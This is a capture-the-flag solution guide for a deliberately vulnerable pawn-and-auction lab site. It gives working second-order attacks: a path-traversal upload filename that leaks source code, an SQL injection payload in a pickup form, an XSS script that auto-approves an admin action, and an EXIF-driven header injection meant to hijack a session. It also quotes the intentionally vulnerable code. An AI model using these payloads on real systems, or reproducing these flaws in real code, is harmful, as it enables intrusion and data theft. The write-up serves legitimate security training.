# Second-Order Pawn

*Solution Guide*

## Overview

In Second-Order Pawn, the team is tasked with exploiting the vulnerable Second-Order Pawn and Auction online site. All of the vulnerabilities are second-order injection attacks; second-hand goods, second-order attacks. These include SQLi, XSS, header injection, and file path traversal.

## Recon

Before we begin attempting to exploit the site, let us first perform some reconnaissance and see how the Second Order site works. If you've already investigated the site and understand the workflow, skip to [Question 1](#question-1). While understanding a web application's functionality is always important, it is crucial here since all of the vulnerabilities will end up being second-order injections and need to be chained through multiple features to trigger. Start by opening your browser of choice in the provided Kali instance, and navigating to `pawn.secondorder.pccc`, and `warehouse.secondorder.pccc`. This will bring us to the home page of each site.

![Index page for pawn site](./imgs/recon-pawnIndex.png "Index page for pawn site")

![Index page for warehouse site](./imgs/recon-warehouseIndex.png "Index page for warehouse site")

On the Pawn site, we can see a sign-up and login buttons, a selection of Pawn items for sale, and an Auctions link. The warehouse only has a sign-up and login page; if we inspect those links by hovering our mouse over them, however, we see the warehouse actually redirects to the pawn site for registration and login. Let's make an account on the pawn site (I use account `asd` and password `asdasd` during CTFs as it's easy to type and remember).

![Second Order Registration Page](./imgs/recon-register.png "Second Order Registration Page")

![The dashboard view after registering](./imgs/recon-pawnDashboard.png "The dashboard view after registering")

After registering, we are redirected to the dashboard page, and some new links are now available. The auctions page is still there, but now we can see "My Bids", "My Auctions", and a link back to the warehouse for dropoffs and pickups. 

On the auctions page, we can see various items that are being auctioned on the site. Selecting an item allows us to view details about it and place a bid. In addition, there are documents or images that we can download (including an option to bulk download all files in a zip file).

![Second Order Auctions Page](./imgs/recon-auctions.png "Second Order Auctions Page")

![A detailed view of an item being auctioned](./imgs/recon-auctionsDetail.png "A detailed view of an item being auctioned")

If you view "My Bids" or "My Auctions", they will both be blank for the moment. However, the "My Auctions" page does have the following message: "All your warehouse items are already listed or you haven't dropped anything off!"

Moving back to the warehouse page, we are now already logged in from the pawn site, and new nav options are available to us. Click "Dashboard" so we can see a brief description of the available options.

![The dashboard view for the warehouse site](./imgs/recon-warehouseDashboard.png "The dashboard view for the warehouse site")

The warehouse provides links to view "My Items", "Drop Off a New Item", and "Pickups". Let's click "Start a New Item Drop-Off". This provides a form for us to fill out to add a new item to the warehouse. I've gone ahead and filled out the form with some test information, including an image and text file (note you can add multiple documents by clicking "Add Another Document").

![The form to drop off a new item at the warehouse](./imgs/recon-newItem.png "The form to drop off a new item at the warehouse")

That item we just created can now be viewed in our items listing page, and we can see the details by clicking on it (note the url for the item contains the number 9, which is the item ID).

![The warehouse page listing our newly uploaded item](./imgs/recon-itemsPage.png "The warehouse page listing our newly uploaded item")

![The details for the new item we just dropped off](./imgs/recon-itemsDetail.png "The details for the new item we just dropped off")

Navigating back to the pawn site, we can now see the item is listed as a new item we can auction in our auction management page. Clicking the "Create New Auction" button gives us a form to create a new auction for the item. We can specify the starting bid, the auction end date (note the tooltip which notes the end date is only informational and not automatically enforced), and we can choose which document to use as the cover image.

![The pawn page listing our newly uploaded item for auction](./imgs/recon-auctionManagement.png "The pawn page listing our newly uploaded item for auction")

![Form to create an auction for our new item](./imgs/recon-auctionNew.png "Form to create an auction for our new item")

After filling out the form, we are redirected to the detail page for our new auction. We can see the bid button has instead been replaced by buttons to "Close Bidding" and "Cancel Auction". Clicking "Close Bidding" will spawn an error letting us know we cannot close the auction until at least one bid has occurred. The "Cancel Auction" button brings up another form, where we need to provide a reason why we want to cancel the auction.

![Our newly created auction item](./imgs/recon-createdAuction.png "Our newly created auction item")

The final feature we need to know about to complete the challenge is winning auctions and picking up items from the warehouse. To test this, let's open an incognito window (so that we can have a new login session without logging out our existing session) and create a new account. Then navigate to our auction item, and place a bid. 

![Placing a bid from a second account on our new item](./imgs/recon-placeBid.png "Placing a bid from a second account on our new item")

Now, on the right side of the above image, we can see our new account placed a bid on our new item. On the left side is the original browser window after refreshing the page, where we can now see the new bid listed at the bottom of our auction listing. Now let's close the bid. Refreshing the page will now show in green text that our second account has won the bid; for example, mine says "Winning Bidder: bababa".

In our second, bid-winning account, we can now visit the bids page to see we've won. The listing also has a button for us to provide pickup info.

![Our bids page with the winning bid shown](./imgs/recon-bidsPage.png "Our bids page with the winning bid shown")

![The form to create a pick-up from the warehouse](./imgs/recon-pickupForm.png "The form to create a pick-up from the warehouse")

Finally, we can find visit the warehouse site and see we have a new pickup ready on the pickup page. The pickup also has a QR code that we are supposed to present in order to pick up our item.

![Our pickup is now ready on our warehouse pickup page](./imgs/recon-warehousePickup.png "Our pickup is now ready on our warehouse pickup page")

![The QR code to present for pickup](./imgs/recon-pickupQR.png "The QR code to present for pickup")

The Second-Order application has a fairly lengthy workflow for a CTF challenge. We can now begin working through the actual challenge. Note that I've reset the challenge after this, so the following walkthrough sections will not have our test entries; if you were following along, you do not need to reset, but various values or numbers throughout may differ from my screenshots.

## Question 1

*Token 1: We need more intel; leak the web application source code. The token will be in a comment in `app.py`.*

The first task for us to accomplish is leaking the source code in the `app.py` file. Besides our earlier recon, we have no indication of where to begin investigating (making this task harder in some ways than the more complicated exploits later on). The best place for us to start our search, though, will be the user file uploads and downloads that we identified during recon.  If you haven't already, create an account and navigate to the warehouse new item page at `http://warehouse.secondorder.pccc/items/new` and open any of the auction detail pages (e.g., `http://pawn.secondorder.pccc/auctions/1`).

Viewing the document links at `http://pawn.secondorder.pccc/auctions/1`, we can see that the links for the documents are:

- `http://pawn.secondorder.pccc/static/uploads/Betsy_Ross_Flag_Certificate.pdf`
- `http://pawn.secondorder.pccc/static/uploads/flag.jpg`

These names do not appear to be randomized, and instead appear to be set by the user. This seems like a promising potential injection site. Based on the path above, user files are saved two directories below the web root (that is, they are stored in `static/uploads`), so we should see what happens when we upload `../../app.py`.

Unfortunately, it is not possible to create a file named `../../app.py`, so we cannot just upload a file using the standard web form! We could use curl (which is what I did during development/testing), but there is a lot of data fields to specify and the web form includes a CSRF token in the form, so let's instead use Burpsuite!

Begin by launching Burpsuite (either from the application menu or typing `burpsuite &` into a terminal), and accepting the terms if prompted. You'll then be presented with the project menu, but we are using the community edition and thus can only create a temporary project, so click "Next", and then "Start Burp" to use the default configuration. 

Now, choose the "Target" tab and select "Scope" in the top left of the window, as shown in the image below. This will allow us to specify the host we are targetting. Under "Include in Scope", click "Add", and enter `secondorder.pccc` as the Prefix. Then select "Include subdomains" to target both `pawn` and `warehouse`. You can (but don't have to) choose "Yes" on the "Proxy history logging" prompt to not log any requests to sites other than our target.

![Setting the Burpsuite Target](./imgs/source-burpTarget.png "Setting the Burpsuite Target")

Now select the Proxy tab, and turn on Intercept by clicking the "Intercept Off" button in the top left. You can then open the Burpsuite browser by clicking the orange "Open Browser" button in the center. Now every time we access a page on either `secondorder.pccc` sites, the request will be intercepted and we can allow/modify/drop it. 

![Turning on Intercept](./imgs/source-burpIntercept.png "Turning on Intercept")

Our first step will be to log back in to our account, so type `http://pawn.secondorder.pccc` into the Burpsuite browser. Note the browser will not allow our request through, and instead we can see the outgoing request in Burpsuite. Hit "Forward" to allow the request to continue. If intercept is on, you'll need to do this for every single request you make. Now that we've seen how that works, you can temporarily disable intercept to login, and reenable it on the "Item Dropoff page" (`http://warehouse.secondorder.pccc/items/new`). Also note that the Burpsuite browser may be more aggressive in upgrading `HTTP` connections to `HTTPS`; if you get a `Failed to connect to warehouse.secondorder.pccc:443` or a similar error, manually edit the URL and change the `https://` to `http://`

![The initial Burpsuite intercept](./imgs/source-burpFirstIntercept.png "The initial Burpsuite intercept")

Now on the new item form, fill it out with any values you'd like. For the file, let's reuse the Betsy Ross flag image we saw earlier; download it with `curl http://pawn.secondorder.pccc/static/uploads/flag.jpg --output test.jpg` and then select it in the file selector. Make sure Intercept is on, then hit "Submit Item". In the following image, you can see my filled out form, as well as the outgoing request captured by Burpsuite.

![Capturing the new item request in Burpsuite](./imgs/source-newItemCaptured.png "Capturing the new item request in Burpsuite")

Now in the intercept window, view the request detail window and scroll down until you see `filename="test.jpg"` (line 29 for me). We can edit the filename before it goes out; simply select the filename, delete it, and type in our target file name: `../../app.py`. With that modification, we can now forward our malicious request by hitting the orange "Forward" button.

![Editing the filename with Burpsuite](./imgs/source-burpRequestDetails.png "Editing the filename with Burpsuite")

The application redirects us to the item detail page on a successful request, so you'll have another captured request in the Burpsuite Interceptor. Go ahead and forward it, and turn off the interceptor. Back in the browser, you should now see a message letting us know the item was created successfully, and a new item listed. Select "View Item", and check the url for our malicious image. Clicking on the document link, we see it now directs us to `http://warehouse.secondorder.pccc/app.py`. We can see the image was uploaded correctly by manually adding the `static/uploads` to the URL: `http://warehouse.secondorder.pccc/app.py` (note the bad file extension means the browser does not render it as an image, so we instead see broken text).

Clearly, something is being mismanaged with the filenames, but at this point it just seems broken, not exploitable. That makes sense, given we are expecting Second-Order attacks, so let's jump over to the pawnshop and see if anything is broken there.

Navigating to our auction management page at `http://pawn.secondorder.pccc/auctions/manage`, we can see our new item is ready to be placed on auction. The item is not used yet at this point, so complete the auction form, using any values you'd like for the starting bid and end date.

![The malicious auction with the download zip button shown](./imgs/source-maliciousAuction.png "The malicious auction with the download zip button shown")

Now that we have the auction, we can see things are clearly broken the same way over here as well, but now we have the option to bulk download the files as a zip file. Go ahead and click the button, and save the file (note that your browser may prompt you to allow the download since this is an insecure `HTTP` server).

Unzipping the archive (either by clicking the "Open" button in the browser downloads to use the default graphical tool or `unzip` in the terminal), we can see that there is indeed a file included in the zip archive name `app.py`. Opening this file reveals a Python Flask app, and our token! If (and when) we need to leak other source files in the future, we can repeat this same attack (for example, if we wanted to leak the database models referenced in `app.py`).

![The leaked source code and token](./imgs/source-token.png "The leaked source code and token")

In this case, the token was `PCCC{DOWNLOAD_ALL_THE_THINGS_2835}`.

<details>
<summary>Why did the zip leak?</summary>

Now that we've recovered the source code, we can identify precisely where this leak occurs.

```python
# --- From warehouse.py, lines 238-269,  which we will leak in the future, that controls the upload
for doc_form in form.documents:
    file = doc_form.file.data
    desc = doc_form.documentDescription.data
    if file and file.filename:
        filename = secure_filename(file.filename)  # Name is secured in variable filename
        save_path = os.path.join(UPLOAD_FOLDER, filename)  
        file.save(save_path)

        metadata = ""

        try:
            with Image.open(save_path) as img:
                img.verify()
            with Image.open(save_path) as img:
                exif = img._getexif()
                if exif:
                    pairs = []
                    for k, v in exif.items():
                        key = f"X-CoverImage-{TAGS.get(k, str(k)).strip()}"
                        val = str(v).strip()
                        pairs.extend([key, val])
                    metadata = ",".join(pairs)
        except Exception:
            pass

        doc = Document(
            item_id=item.id,
            filename=file.filename,  # Insecure filename is accidently saved in database
            description=desc,
            metadata=metadata
        )

# --- In app.py, lines 241-277

@app.route("/auctions/<int:auction_id>/download")
def download_auction_docs(auction_id):
    with Session() as session:
        auction = session.query(Auction).get(auction_id)
        if not auction:
            abort(404)

        if not auction.public and (not current_user.is_authenticated or current_user.id != auction.user_id):
            abort(403)  

    item_id = auction.warehouse_id
    if not item_id:
        abort(404)

    # Insecure filename is retrieved
    query = f"SELECT filename, description FROM documents WHERE item_id = {item_id}"
    with engine_warehouse.connect() as conn:
        rows = conn.execute(text(query), {"item_id": item_id}).mappings().all()

    if not rows:
        abort(404)

    # While Flask prevented the URL access to app.py, the bad filename "../../app.py" is passed to the following zip file creator
    zip_buffer = BytesIO()
    with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as zipf:
        for doc in rows:
            filename = doc['filename']
            path = os.path.join("static", "uploads", filename)
            if os.path.isfile(path):
                zipf.write(path, arcname=filename)

    zip_buffer.seek(0)
    return send_file(
        zip_buffer,
        mimetype='application/zip',
        as_attachment=True,
        download_name=f"auction_{auction_id}_documents.zip"
    )
```

I've added comments to the code explaining, but the short version is that the malicious filename `../../app.py` is saved in the database. Flask is designed to only allow files in the `static` directory to be directly accessible, so Flask prevents `app.py` from being downloaded directly. However, the zip file creation does not have this protection, and trusts and uses the unsafe user input in the database directly.

</details>

## Question 2

*Token 2: Compromise the database and find this token in the description of an unpublished auction item named `Token`.*

Alright, now that we've leaked the source code, we can more precisely search for the vulnerability. In this case, we need to leak a value from the database, so we are almost certainly looking for SQLi. Let's begin by reviewing how the code interacts with the database (note that the full code can also be found in [this repo](../challenge/pawnShop/app/app.py)).

Looking through, we can see that the pawn site is a Flask app and that it is using SQLAlchemy Object-Relational Mapping (ORM) to handle querying data in the pawn site's database. For example, the following code is used to retrieve usernames from the database on lines 105-106.

```python
with Session() as session:
    existing = session.query(User).filter_by(username=form.username.data).first()
```

These functions are secure, and will prevent our SQLi attempts. However, we can see on line 15 that there are actually two databases being used in this app: `from db import Session, engine_warehouse`. Instead of using SQLAlchemy's ORM for the warehouse, the warehouse is interacted with using custom SQL statements:

```python
# Lines 52-87 of app.py
def load_warehouse_data(auctions, engine_warehouse=engine_warehouse):
    # Warehouse boys sent over their code for us to review; I saved it in warehouse.py
    if not auctions or len(auctions) == 0:
        return
    
    item_ids = {a.warehouse_id for a in auctions if a.warehouse_id}
    cover_ids = {a.cover_image for a in auctions if a.cover_image}

    item_map = {}
    doc_map = {}     
    cover_map = {}    

    if item_ids:
        # Don't let anyone change this query without checking with DBAs
        placeholders = ', '.join(str(int(i)) for i in item_ids)
        item_query = f"SELECT * FROM items WHERE id IN ({placeholders})"
        doc_query = f"SELECT * FROM documents WHERE item_id IN ({placeholders})"
        with engine_warehouse.connect() as conn:
            items = conn.execute(text(item_query)).mappings().all()
            docs = conn.execute(text(doc_query)).mappings().all()
            item_map = {row['id']: row for row in items}
            for doc in docs:
                doc_map.setdefault(doc['item_id'], []).append(doc)

    if cover_ids:
        # Cover images are just documents, don't ask why
        placeholders = ', '.join(str(int(i)) for i in cover_ids)
        cover_query = f"SELECT * FROM documents WHERE id IN ({placeholders})"
        with engine_warehouse.connect() as conn:
            covers = conn.execute(text(cover_query)).mappings().all()
            cover_map = {row['id']: row for row in covers}

    for a in auctions:
        a.item = item_map.get(a.warehouse_id)
        a.documents = doc_map.get(a.warehouse_id, [])
        a.cover_doc = cover_map.get(a.cover_image)
```

We can see that the variable `placeholders` is interpolated directly into the SQL query, but unfortunately this isn't exploitable either! This data is not even user data, and it only allows integers. There are several other locations like this, but they are all similarly not exploitable. However, the code above has an interesting comment in it: `Warehouse boys sent over their code for us to review; I saved it in warehouse.py`. Viewing the code, you may have already noticed that none of the warehouse routes are shown. The warehouse is an entirely different application on a different host, but this comment suggests that the code may still be located on the pawn server.

We need to repeat the process from [Question 1](#question-1) to leak the warehouse code, but this time our filename will be `../../warehouse.py` instead of `../../app.py`. The final step of that process is shown in the image below, and the full code can also be found in [this repo](../challenge/pawnShop/app/warehouse.py).

![The leaked warehouse source code](./imgs/sqli-leak.png "The leaked warehouse source code")

With that code leaked, we can now see there is a similar pattern on the warehouse side: SQLAlchemy ORM models are used to access the database that belongs to the warehouse, and custom SQL queries are used to query the pawn database. Most of the potential injection sites, however, also follow the same pattern: they are not user data, and are limited to integers only! However, there is one route, `/items/<int:item_id>/claim`, from lines 170-204, that does not have these restrictions.

```python
@app.route("/items/<int:item_id>/claim", methods=["GET"])
@login_required
def claim_item(item_id):
    # redirect here after QR scan and confirm press
    with engine_pawn.connect() as conn:
        result = conn.execute(
            text(f"SELECT name, email FROM pickups WHERE item_id = {item_id} AND user_id = {current_user.id}")
        ).fetchone()

        if not result:
            abort(404)

        name, email = result

    with engine.begin() as conn:
        already = conn.execute(
            text(f"""
                SELECT 1 FROM confirmed_pickups
                WHERE item_id = {item_id} AND user_id = {current_user.id}
            """)
        ).fetchone()

        if already:
            flash("You've already marked this item as claimed.", "warning")
            return redirect(url_for("pickups"))

        conn.execute(
            text(f"""
                INSERT INTO confirmed_pickups (item_id, user_id, name, email)
                VALUES ({item_id}, {current_user.id}, '{name}', '{email}')
            """)
        )

    flash("Item marked as claimed!", "success")
    return redirect(url_for("pickups"))
```

Reviewing this code, we can determine based on the comment, route, and behavior that this code is executed when an item is picked up after a winning bid. In this case, the pickup information is retrieved from the pawn database (the first `with` block) and then that information is copied into a warehouse table named `confirmed_pickups` to mark the item as picked up. However, the developer accidentally reused the engine connect format here for the warehouse side, and incorrectly uses the user input in the pawn database, interpolating it directly into the query. We can thus achieve SQLi using the name field in the pickup form.

Exploiting this will require a lot of steps; we need to create an item, auction it, bid on it with a second account, close the auction, set the pickup information with our SQLi payload, and then trigger this route from the QR code. Please refer to [recon](#recon) for a walkthrough of that. 

Since we don't want to run this multiple times, let's carefully craft our SQLi payload now. The query will look something like this:

```sql
INSERT INTO confirmed_pickups (item_id, user_id, name, email)
    VALUES (1, 1, 'name', 'test@test.com')
```

We can inject into the `name` value, and need to leak the description of an item named `Token`. The SQL query to achieve that would be the following (note we know the table and column names from the leaked code):

```sql
SELECT description FROM items WHERE name="Token"
```

We can run this as a subquery in our insert statement. This will insert the result into the `confirmed_pickups` table, and we can then view the result in our dashboard. Our payload will be:

```sql
', (SELECT description FROM items WHERE name="Token")) -- a
```

Note the single quote, comma, closing paren, and comment (note MySQL wants a space after `-- `, so I include an `a` afterwards to ensure it doesn't get stripped). Copying this into the original query in place of `name`, the payload will result in the following query. Note that the token will actually end up in the email column, and the name will be blank.

```sql
INSERT INTO confirmed_pickups (item_id, user_id, name, email)
    VALUES (1, 1, '', (SELECT description FROM items WHERE name="Token")) -- a', 'test@test.com')
```

This payload looks good, so go ahead and get your pickup form ready. The following image shows the pickup form with the payload in the name field.

![The malicious pickup form](./imgs/sqli-evilPickup.png "The malicious pickup form")

Next, we go to the warehouse and view the pickup QR code. We haven't yet inspected the QR code, but if you scan it with your phone or use another technique to read the QR code (e.g., downloading the image and using `zbarimg` from apt package `zbar-tools`), you'll find that the QR code links us to `http://warehouse.secondorder.pccc/items/12/claim` (your item ID may be different). Note that we didn't actually need to decode the QR code, though; we already knew the route from the leaked source code!

We can simply visit that page ourselves to trigger the claim; paste the claim URL into your browser (using your item ID) to trigger the SQLi. If your SQLi was successful, you should be redirected right to the pickup detail page with the token, shown below. Note that if your SQLi was *not* successful and the page errored out (meaning the SQL failed to save to the database), you don't need to create an entirely new pickup; instead, visit the pawn site again and update your pickup information. If the SQL was successfully executed and saved into the database, you'll need to repeat the bidding process again.

![The pickup detail page with the token](./imgs/sqli-token.png "The pickup detail page with the token")

In this case, the token was `PCCC{Lowest_bidder_wins_9099}`.

## Question 3

*Token 3: Your successful database exfiltration has revealed the Pawn and Warehouse databases are separated; you'll need to find a different way to get the admin to approve your auction cancellation request.*

*The admin checks for and denies any cancellation request every 10-20 seconds. The token will be provided once any cancellation request has been approved.*

Now we need to somehow cancel an auction. Given the question specifies there is an admin bot that regularly attempts, we can assume this exploit will require an active victim, but we don't yet know exactly what we need to do. Let's start by checking the cancellation route in the source code.

```python
@app.route("/auctions/<int:auction_id>/cancel", methods=["GET", "POST"])
@login_required
def request_cancellation(auction_id):
    # Don't let users spam cancel — see product notes
    form = CancellationRequestForm()

    with Session() as session:
        auction = session.query(Auction).get(auction_id)
        if not auction or auction.user_id != current_user.id:
            abort(403)

        load_warehouse_data([auction], engine_warehouse)

        if auction.cancellation and auction.cancellation.approved is not False:
            flash("A cancellation request has already been submitted.", "warning")
            return redirect(url_for("auction_detail", id=auction_id))

        if form.validate_on_submit():
            if auction.cancellation and auction.cancellation.approved is False:
                auction.cancellation.reason = form.reason.data.strip()
                auction.cancellation.approved = None
            else:
                cancellation = Cancellation(
                    auction_id=auction_id,
                    reason=form.reason.data.strip()
                )
                session.add(cancellation)

            session.commit()
            flash("Cancellation request submitted for review.", "success")
            return redirect(url_for("auction_detail", id=auction_id))
        return render_template("cancellation.html", form=form, auction=auction)

@app.route("/admin/cancellation/<int:id>", methods=["GET", "POST"])
@login_required
def review_cancellation(id):
    # Only admins allowed — don't change this check
    if current_user.role != "admin":
        abort(403)

    form = AdminCancellationDecisionForm()

    with Session() as session:
        cancellation = session.query(Cancellation).get(id)
        if not cancellation:
            abort(404)

        auction = cancellation.auction
        
        load_warehouse_data([auction])

        if form.validate_on_submit():
            if form.approve.data:
                cancellation.approved = True
                flash("Cancellation approved.", "success")
            elif form.deny.data:
                cancellation.approved = False
                flash("Cancellation denied.", "danger")
            session.commit()
            return redirect(url_for("review_cancellation", id=id))

        reason_html = html_escape(cancellation.reason)

        return render_template("review_cancellation.html", auction=auction, cancellation=cancellation, form=form, reason_html=reason_html)
```

The first route is the cancellation form that is available to us. The second form is more interesting, as this is the route that the admin will actually interact with. In that admin function, we find the line `reason_html = html_escape(cancellation.reason)`. The `html_escape` comes from the import statement `from markupsafe import Markup as escape_html`; the `Markup` class does not escape HTML, but instead marks a string as already sanitized! This name change was done to prevent this vulnerability from being easily detected by AI (specifically, this was tested against ChatGPT). Token 2 can be identified with several false positives (but is also obvious to humans); it partially detects Token 4 as well, but requires combining two attacks, and ChatGPT gives misleading information for it.

This means that the cancellation form is vulnerable to XSS. We can exploit this to write some custom JavaScript that accepts our cancellation automatically when the admin views the page. We could try just calling the cancellation route directly from our JS, but CSRF is enforced using the form builder `Flask-WTF`; writing JS to submit the form will be our easiest approach. 

Now we need to know what the form looks like. However, it is very possible to skip this next step by making some reasonable assumptions about the code since `Flask-WTF` is used (e.g., we assume that approved and deny are input buttons, we know `Flask-WTF` will name them `approve` and `deny` from the line `form.approve.data` and `form.deny.data`). From the import `from forms.auction_form import CreateAuctionForm, CloseAuctionForm, CancelAuctionForm`, we know the file for the form is `../../forms/auction_form.py`, and from  `render_template("review_cancellation.html"` we know the HTML is in `../../templates/review_cancellation.html`. We can use the trick from [Question 1](#question-1) to retrieve this code (note we can leak both files at once by uploading two documents with the same item, and changing both names in the same intercept).

With that done, we can confirm our earlier assumption from the leaked form: they are submit inputs named `approve` and `deny`. We can use the following HTML with JavaScript as our payload, which waits for the page to load, and then clicks the approve button.

```html
<script>
  window.onload = function() {document.querySelector('input[name="approve"]').click();};
</script>
```

If you don't have an auction item ready to cancel, create one now; I'm going to reuse the auction from Question 2. Navigating to the cancellation form, copy our payload into the reason box. Note that the bot checks the form for success afterwards and manually denies by writing to the database if it failed; this prevents you from locking yourself out if the script breaks the bot (e.g., calling `alert()` will cause the page to fail to render correctly).

![The cancellation form with our payload](./imgs/cancel-payload.png "The cancellation form with our payload")

Now simply refresh the auction detail page until either an approval or denied message appears at the top of the page. If it's an approval message, the token is appended at the end.

![The item detail page after our request was incorrectly approved!](./imgs/cancel-token.png "The item detail page after our request was incorrectly approved!")

In this case, the token is `PCCC{hey_no_takesies_backsies_8794}`.

## Question 4

*Token 4: The spy has arrived at the warehouse for the drop-off. Hijack their session so they create the auction under your account, which we can forcibly cancel later.*

*The spy seems nervous for the hand-off; our monitoring shows he is mindlessly refreshing the RSS feed and reviewing any **new** items added to the list. The token will be in the item description after you compromise their session. Similar to Token 3, the spy does this every 10-20 seconds.*

For the final token, we need to hijack the session of the spy. We know the spy is routinely checking the RSS feed and the item details, so those routes would be a good place to start inspecting. First, the RSS function.

```python
@app.route('/rss')
def rss_feed():
    session = Session()
    auctions = session.query(Auction).filter_by(public=True, open=True).order_by(Auction.id.desc()).limit(5).all()
    auctions = auctions[::-1]
    load_warehouse_data(auctions)

    rss = ET.Element("rss", version="2.0")
    channel = ET.SubElement(rss, "channel")

    ET.SubElement(channel, "title").text = "Second-Order Pawn and Auctions"
    ET.SubElement(channel, "link").text = url_for("index", _external=True)
    ET.SubElement(channel, "description").text = "Newest open auctions from the pawn shop"
    ET.SubElement(channel, "lastBuildDate").text = datetime.now(timezone.utc).strftime('%a, %d %b %Y %H:%M:%S UTC')

    for auction in auctions:
        item = ET.SubElement(channel, "item")
        ET.SubElement(item, "title").text = auction.item["name"]
        ET.SubElement(item, "link").text = url_for("auction_detail", id=auction.id, _external=True)
        ET.SubElement(item, "description").text = auction.item.get("description", "")
        ET.SubElement(item, "pubDate").text = auction.end_date.strftime('%a, %d %b %Y %H:%M:%S UTC')

    rss_xml = ET.tostring(rss, encoding='utf-8', method='xml')

    headers = {
        "Content-Type": "application/rss+xml",
        "X-Feed-Generated-By": "PawnFeedGen/1.0",
        "X-Feed-Items": str(len(auctions)),
    }

    return (rss_xml, 200, headers)
```

We had not looked at the RSS feed before, but there is a link to it in the bottom left corner of the Pawn and Warehouse sites at `http://pawn.secondorder.pccc/rss`. Without an RSS viewer, the output is simply some unformatted XML like the following (the exact items listed will depend on what Auctions you've created).

```xml
<rss version="2.0"><channel><title>Second-Order Pawn and Auctions</title><link>http://pawn.secondorder.pccc/</link><description>Newest open auctions from the pawn shop</description><lastBuildDate>Thu, 07 Aug 2025 02:58:21 UTC</lastBuildDate><item><title>Corgi with Crown Collar</title><link>http://pawn.secondorder.pccc/auctions/6</link><description>To whom it may concern, I won this lovely corgi statue from the Queen Elizabeth collection from the local knitting competition for "loveliest sweater". While I adore it very much, my grandson will be going to college soon, and I would like to help him along. If you think this will make a great fit in your home, please consider helping my grandson! Sincerely, Ethel</description><pubDate>Mon, 23 Feb 2026 18:00:00 UTC</pubDate></item><item><title>Collectible Giant Stuffed Dragon</title><link>http://pawn.secondorder.pccc/auctions/7</link><description>A giant dragon stuffed animal, lightly used. Part of a collectible set.</description><pubDate>Tue, 24 Feb 2026 09:00:00 UTC</pubDate></item><item><title>D&amp;D The Keep on the Borderlands</title><link>http://pawn.secondorder.pccc/auctions/8</link><description>A heavily used, but intact, copy of "The Keep on the Borderlands" from 1980 for the first edition of Dungeons and Dragons.</description><pubDate>Tue, 17 Feb 2026 13:00:00 UTC</pubDate></item><item><title>Malicious Upload</title><link>http://pawn.secondorder.pccc/auctions/9</link><description>Evil upload, muhahahaha</description><pubDate>Wed, 06 May 2026 04:36:00 UTC</pubDate></item><item><title>Warehouse Please!</title><link>http://pawn.secondorder.pccc/auctions/10</link><description>Hello, please give me warehouse.py, pls and thx</description><pubDate>Wed, 08 Apr 2026 06:31:00 UTC</pubDate></item></channel></rss>
```

Between the example output and the source code, there does not seem to be anything vulnerable here. However, the RSS feed simply lists the most recently created auctions, so we can easily ensure a link to one of our auctions is present in the RSS feed. Let's review the auction detail route now.

```python
@app.route("/auctions/<int:id>")
def auction_detail(id):
    # If you break this, the support inbox will fill up fast
    with Session() as session:
        auction = session.query(Auction).options(
            selectinload(Auction.bids),
            selectinload(Auction.winning_user)
        ).get(id)
        if not auction:
            abort(404)
        if not auction.public and (not current_user.is_authenticated or current_user.id != auction.user_id):
            abort(403) 
            
        if auction.cancellation and current_user.id == auction.user_id:
            if auction.cancellation.approved:
                flash(f"Your cancellation request was approved; this item will be removed shortly and available for pick up in 1–100 business days. {cancelToken}", "success")
            elif auction.cancellation.approved is not None and not auction.cancellation.approved:
                flash("Your cancellation request has not been approved. If you believe this was an error, please update your request.", "danger")

        load_warehouse_data([auction], engine_warehouse)

        current_top = max((b.bid for b in auction.bids), default=auction.starting_bid)
        min_bid = current_top + 1

        bid_form = BidForm(min_bid=min_bid) if current_user.is_authenticated and auction.user_id != current_user.id else None
        close_form = CloseAuctionForm() if current_user.is_authenticated and auction.user_id == auction.user_id else None
        cancel_form = CancelAuctionForm() if current_user.is_authenticated and auction.user_id == auction.user_id else None

        html = render_template("auction_detail.html", auction=auction, bid_form=bid_form, close_form=close_form, cancel_form=cancel_form)
        resp = make_response(html)
         
        resp.headers["X-Item-ID"] = str(auction.item["id"])
        resp.headers["X-Auction-User-ID"] = str(auction.user_id)
        if auction.winning_user:
            resp.headers["X-Winning-User-ID"] = str(auction.winning_user.id)
        resp.headers["X-Top-Bid"] = str(current_top)
        resp.headers["X-Minimum-Bid"] = str(min_bid)
        resp.headers["X-Num-Bids"] = str(len(auction.bids))
        resp.headers["X-Auction-Open"] = str(auction.open).lower()
        
        metadata_csv = next((d["metadata"] for d in auction.documents if d["id"] == auction.cover_image), "")
        if metadata_csv:
            parts = [p.strip() for p in metadata_csv.split(",")]
            for i in range(0, len(parts) - 1, 2):
                key = parts[i]
                value = parts[i + 1]
                if key and value:
                    resp.headers[key] = value

        return resp
```

This function does a lot, but the important part is the following:

```python
resp = make_response(html)
         
resp.headers["X-Item-ID"] = str(auction.item["id"])
resp.headers["X-Auction-User-ID"] = str(auction.user_id)
if auction.winning_user:
    resp.headers["X-Winning-User-ID"] = str(auction.winning_user.id)
resp.headers["X-Top-Bid"] = str(current_top)
resp.headers["X-Minimum-Bid"] = str(min_bid)
resp.headers["X-Num-Bids"] = str(len(auction.bids))
resp.headers["X-Auction-Open"] = str(auction.open).lower()

metadata_csv = next((d["metadata"] for d in auction.documents if d["id"] == auction.cover_image), "")
if metadata_csv:
    parts = [p.strip() for p in metadata_csv.split(",")]
    for i in range(0, len(parts) - 1, 2):
        key = parts[i]
        value = parts[i + 1]
        if key and value:
            resp.headers[key] = value
```

This code segment sets a bunch of headers providing metadata about the auction. This includes some metadata about the cover image at the end, which comes from the database. The name `metadata_csv` suggests the metadata is stored in the database as a string of comma-separated values, and the following code splits the string accordingly. The values are then used to set *both* the header key and the value. That is, the string might be `header1,value1,header2,value2`. We need to identify where this comes from; if we can control this, it might be possible to inject a `Set-Cookie` header. This header would be sent to anyone viewing that item, including our victim. If we use our session cookie, we could swap the spy's session to our account.

With that plan, let's track down where the documents come from. Checking through `app.py`, the documents are actually loaded in from the warehouse database in the `load_warehouse_data` helper function. Switching over to the warehouse source code, we can find the metadata is loaded during new item creation as part of the function `create_form` (lines 248-262):

```python
try:
    with Image.open(save_path) as img:
        img.verify()
    with Image.open(save_path) as img:
        exif = img._getexif()
        if exif:
            pairs = []
            for k, v in exif.items():
                key = f"X-CoverImage-{TAGS.get(k, str(k)).strip()}"
                val = str(v).strip()
                pairs.extend([key, val])
            metadata = ",".join(pairs)
except Exception as e:
    # some uploads throw here — ignore and move on
    print(e)
```

